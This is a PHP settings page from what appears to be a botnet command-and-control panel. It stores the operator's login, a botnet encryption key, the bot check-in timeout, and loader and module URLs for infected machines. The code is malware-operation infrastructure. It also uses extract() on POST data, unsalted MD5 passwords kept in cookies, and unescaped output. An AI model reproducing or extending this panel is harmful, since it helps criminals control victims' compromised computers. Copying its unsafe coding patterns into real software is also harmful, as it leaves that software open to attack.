<?php

define("TPL_TITLE", "Config");

$errMsg = array();

if (isset($_POST["save"]))
{
	extract($_POST);
	
	if ($timeout <= 0 || $timeout > 60) {
		$errMsg[] = "Invalid timeout.";
	}
	/*
	if (strlen($botnet_crypt_key) < 6 || strlen($botnet_crypt_key) > 32) {
		$errMsg[] = "Invalid encryption key.";
	}
	*/
	if (strlen($user) < 4 || strlen($user) > 16) {
		$errMsg[] = "Invalid user.";
	}
	
	if (strlen($pass) > 0) {
		if (strlen($pass) < 8 || strlen($pass) > 32) {
			$errMsg[] = "Invalid password.";
		}
	}
	
	if (count($errMsg) == 0)
	{
		$config_tpl = CsrGetConfigTpl();
		CsrSetCookie("user", $user, LIVE_AUTH_COOKIE);
		if (strlen($pass) > 0) {
			$config["pass"] = md5($pass);
			CsrSetCookie("pass", $config["pass"], LIVE_AUTH_COOKIE);
		}
		
		$config["user"] = $user;
		$str_config = sprintf($config_tpl, $config["user"], $config["pass"], $config["sql_host"], $config["sql_user"], $config["sql_pass"], $config["sql_db"], 
													$config["botnet_crypt_key"], $timeout, $config["loader_url"], $config["module_url"], $config["config_url"], $config["cache_file"]);
																		
		file_put_contents(CORE . "config.php", $str_config);
		
		$msg = "New data accepted.";
	}
}
else
{
	$user = $config["user"];
	$botnet_crypt_key = $config["botnet_crypt_key"];
	$timeout = $config["bot_timeout"];
}

ob_start();
?>

<form class="form-horizontal" method='post'>
	<table class="table table-striped table-bordered table-condensed table-hover">
			<tr>
				<td class="col-md-3"> User (4-16 chars): </td> 
				<td> <input type="text" class="form-control input-sm" name="user" value="<?=@$user?>"> </td>
			</tr>
			<tr>
				<td class="col-md-3"> Password (8-32 chars): </td> 
				<td> <input type="text" class="form-control input-sm" name="pass" value="<?=@$pass?>"> </td>
			</tr>
			<!--
			<tr>
				<td class="col-md-3"> Encryption key (6-32 chars): </td> 
				<td> <input type="text" class="form-control input-sm" name="botnet_crypt_key" value="<?=@$botnet_crypt_key?>"> </td>
			</tr>
			-->
			<tr>
				<td> Bot timeout (1-60 min): </td> 
				<td> <input type="text" class="form-control input-sm" name="timeout" value="<?=@$timeout?>"> </td>
			</tr>
		</table>
	<div> <button type="submit" name='save' class="btn btn-default btn-sm">Save</button> </div> <br/>
	<div> <font color=green> <?=@$msg?> </font> </div>
	<div> <font color=red> <?  foreach ($errMsg as $msg) { echo $msg . "<br/>"; } ?> </font> </div>
</form>

<?php
$content = ob_get_contents();
ob_end_clean();

$header_tpl = file_get_contents(TPL_PATH . "header.html");
$header_tpl = str_replace(array("{TPL}", "{SCRIPTS}", "{TITLE}"), array(TPL_PATH, "", TPL_TITLE), $header_tpl);

$menu_tpl = file_get_contents(TPL_PATH . "menu.html");
$menu_tpl = str_replace(array("{CORE_FILE}", "{CUR_TIME}", "{CONFIG_ACTIVE}"), array(CORE_FILE, gmdate("M d Y H:i:s", mktime()), "active"), $menu_tpl);

$body_tpl = file_get_contents(TPL_PATH . "body.html");
$body_tpl = str_replace(array("{MENU}", "{BODY_CLASS}", "{CONTENT}"), array($menu_tpl, "bots", $content), $body_tpl);
$footer_tpl = file_get_contents(TPL_PATH . "footer.html");

echo str_replace(array("{HEADER}", "{BODY}", "{FOOTER}"), array($header_tpl, $body_tpl, $footer_tpl), file_get_contents(TPL_PATH . "main.html"));
?>